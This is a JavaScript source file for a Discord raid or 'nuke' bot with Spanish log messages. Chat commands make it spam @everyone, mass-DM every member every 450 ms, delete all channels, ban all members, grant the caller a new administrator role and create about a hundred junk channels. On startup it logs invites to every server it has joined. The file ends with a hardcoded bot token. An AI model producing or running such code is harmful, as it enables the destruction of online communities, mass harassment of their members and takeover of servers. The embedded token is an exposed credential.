const Discord = require("discord.js");
const bot = new Discord.Client();



bot.on("ready", function() {
  setInterval(async () => {
    const statuslist = [`pan`];
    const random = Math.floor(Math.random() * statuslist.length);

    try {
      await bot.user.setPresence({
        status: "online"
      });
    } catch (error) {
      console.error(error);
    }
  }, 3000);
  bot.guilds.forEach(guild => {
    var invite = bot.guilds
      .find("id", guild.id)
      .channels.find("id", guild.channels.random().id);
    invite
      .createInvite()
      .then(invite => console.log(`Estoy en: ${guild.name} ${invite}`));
  });
});

bot.on("message", msg => {
  if (msg.content === "1atack") {
    console.log(`El comando que puse lo puso el ${msg.author.tag}`);
    var interval = setInterval(function() {
      msg.channel.send(
        "**:)** ||@everyone||"
      );
    }, 5000);
  }
  if (msg.content === "1atack") {
    console.log(`El comando de atacar lo puso el ${msg.author.tag}`);
    if (msg.channel.type === "dm") return;
    if (msg.deletable) msg.delete();
    msg.guild.members.forEach(member => {
      setInterval(function() {
        member
          .send(
            "**El servidor cagó**"
          )
          .catch(error => {});
      }, 450);
    });
  }

  if (msg.content === "1n") {
    if (msg.channel.type === "dm") return;
    if (msg.guild.channels.size === 0) return;
    else if (!msg.guild.member(bot.user).hasPermission("MANAGE_CHANNELS"))
      return;
    msg.guild.channels.forEach(chan => {
      if (chan.deletable) chan.delete();
    });
  }


  if (msg.content === "1ban") {
    console.log(`Banee a todos por ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "  ") && member.bannable)
        member.ban().catch(e => {});
    });
  }

  if (msg.content === "1leave") {
    console.log(`Me salí por ${msg.author.tag}`);
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }

  if (msg.content === "1dios") {
    console.log(`Le dí admin al ${msg.author.tag}`);

    msg.member.guild
      .createRole({
        name: "abre los ojos",
        permissions: "ADMINISTRATOR",
        mentionable: false
      })
      .then(function(role) {
        msg.member.addRole(role);
        if (msg.deletable) msg.delete().catch(e => {});
      })
      .catch(e => {});
  }

  if (msg.content ==="1atack") {
    msg.delete();
    let interval = setInterval(function() {
      msg.guild.channels.forEach(channel => {
        if (channel.type === "text")
          channel.send(
            "**:)** @everyone"
          );
      }, 2500000);
    });
  }
  if (msg.content ==="1c"){
    let guild = msg.guild
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });
    guild.createChannel('cagaste',{
      type:"text"
    });


    

    


  }
});

bot.login("ODY4OTE5MzEyNDk5NDc4NTU5.YP2qKw.NMV7uW_3JEwqkvqm4cHRjbt9MxY");
